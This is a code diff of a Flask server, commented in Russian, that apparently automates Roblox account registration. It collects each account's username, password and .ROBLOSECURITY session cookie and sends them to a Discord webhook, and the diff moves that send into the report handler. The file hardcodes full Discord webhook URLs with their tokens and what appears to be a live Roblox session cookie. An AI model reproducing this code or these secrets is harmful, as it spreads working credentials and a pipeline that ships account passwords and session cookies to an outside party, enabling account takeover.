@@ -8,11 +8,8 @@ from collections import defaultdict
 app = Flask(__name__)
 
 SECRET_TOKEN = os.environ.get('SECRET_TOKEN', 'Worldoftanks_508')
-# Регистрационный вебхук (для новых аккаунтов)
 WEBHOOK_URL = "https://discord.com/api/webhooks/1508168697817206966/e24vDYHZC_seyBOd8KArGhN09FVQJRxd4QAHJ7EN66hFfZBtAgkFKacozVQruQgE0kJW"
-# Системный вебхук (для информации о запуске)
 SYSTEM_WEBHOOK_URL = "https://discord.com/api/webhooks/1508181159115231464/oUlAox7uTWpI2trZZFmk4vlOih1PerXfcL2x9sk11DQoqGbzDfAeGW5XTgQwljjZbfHM"
-
 ROBLOX_TOKEN = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhsKBGR1aWQSEzQzNTMxNDY3ODUwOTE2NzU5MTQoBA.zVI4gBi9pCIZhtKqS8fSkVWAHJt3IK0VcR86NGOeI9BlXeOCFEU0wAmihWNndBGSdeJAOTxV94CaDF3Mt17JB14MjRhvWUn130zdYZsJHZKTldVwBr5Stex0yZS8mm1dfXKrT52CVUVnCp_3VWaETpdG7yS4iV4WSA4hgJsE2SsU8fCVBwNj_CewmNWVAMjMiEntODMMG61oI7wX7aVgyHrf3Ra4UJUvpcyrLAUcCKllP97YpQl15OTa82BdDQFyzdM5kUrdw1XTWRJ_POox2jB-kmugm1Gh8fvqECKPhcY1DiJX3jOBqPywraCIIrhreH6QNIWlHxw0aw3wJA_qMJnQeLQOmJLc_NEbGDnkfH_LNFyowtLblSDI0_XY641aQKMNbh9QePK6IpLsVtxFiuzb9E4gAaZ1R7DM6KGEUYy064FeKfAKx2QusL7u6hceJL0OK0nhMWIDn5yMEWRYgYJZn946nG5C0VFithS3K7xYN3_swSx_N5XvJKtoLM6lJtzj7gBt-EYmyf8MaDLL5pmHwunBFv8wWZyFn0tER-lfPRWjVDF8-DTIkFNDDE3bl6N-1hApBtTq7UiA2fF-Jq6wBdXJV1x3oaSeSRlmRc5HTYZKODa5wBQCTW6oqxqqyH6UFcMbLbtlaK9djhuC8Tt63CNHufi3zKjSoJysHkrbMXmkFyuZBEbjX9jpFbz6RK5whs6UAC0Jsu7BdhSlH8jBOA67m7y_p5Bqd2vjBvcZ4ghizX0iNac1t0NnMF6Cog-JDyU8z2cVuR29RhR5D50BMy_X-KQN0pIRVhpVs_P0BPI9RiWrEsbUBYKIj0qFMNxFBkkK9h3fs5-kVPuUCPsv2k3A96GAqh6rBy0B4D4mDA1EE_meSBmdeTMTACrXhpVQeO45QnsZu8YEiEA-VjWikhW4LniuAVaH8JTrnAS7FjlJ"
 APP_ENABLED = True
 
@@ -42,7 +39,6 @@ states = defaultdict(lambda: {
 })
 
 def send_discord(content, file_content=None):
-    """Отправляет уведомление в регистрационный вебхук (полная кука)."""
     try:
         if file_content:
             files = {'file': ('cookie.txt', file_content)}
@@ -142,32 +138,14 @@ def next_action():
         state["step"] = 24
         return jsonify({"action": "get_cookie", "name": ".ROBLOSECURITY"})
     elif step == 24:
+        # Получена новая кука, отправляем данные клиенту для сохранения (без номера)
         cookie = state.get("new_cookie") or ""
         username = state["username"]
         password = state["password"]
-        # Подсчёт номера аккаунта (локально на сервере, но можно и не сохранять)
-        acc_num = 1
-        if os.path.exists("counter.txt"):
-            with open("counter.txt", "r") as f:
-                acc_num = int(f.read().strip()) + 1
-        with open("counter.txt", "w") as f:
-            f.write(str(acc_num))
-
-        # Отправляем в Discord полную куку (не обрезаем!)
-        # Если кука очень длинная (более 1900 символов), отправляем файлом, иначе текстом.
-        msg = f"**✅ New Registration**\nAccount: {acc_num}\nUsername: {username}\nPassword: {password}\nCookie:"
-        if len(cookie) <= 1900:
-            msg += f"\n```{cookie}```"
-            send_discord(msg)
-        else:
-            # Отправляем текстовое сообщение без куки, а куку — файлом
-            send_discord(msg, file_content=cookie)
-
-        # Отдаём клиенту команду сохранить аккаунт локально
+        # Очищаем состояние потока
         state["step"] = 99
         return jsonify({
             "action": "save_account",
-            "account_number": acc_num,
             "username": username,
             "password": password,
             "cookie": cookie
@@ -193,8 +171,18 @@ def report():
         if result.get('new_cookie'):
             state["new_cookie"] = result['new_cookie']
     elif action == "save_account" and success:
-        # Можно ничего не делать, просто подтверждение
-        pass
+        # Клиент сообщает номер, под которым сохранил аккаунт
+        acc_num = result.get('account_number')
+        username = result.get('username')
+        password = result.get('password')
+        cookie = result.get('cookie')
+        # Отправляем уведомление в Discord с правильным номером
+        msg = f"**✅ New Registration**\nAccount: {acc_num}\nUsername: {username}\nPassword: {password}\nCookie:"
+        if len(cookie) <= 1900:
+            msg += f"\n```{cookie}```"
+            send_discord(msg)
+        else:
+            send_discord(msg, file_content=cookie)
     return jsonify({"status": "ok"})
 
 @app.route('/api/is_enabled', methods=['POST'])
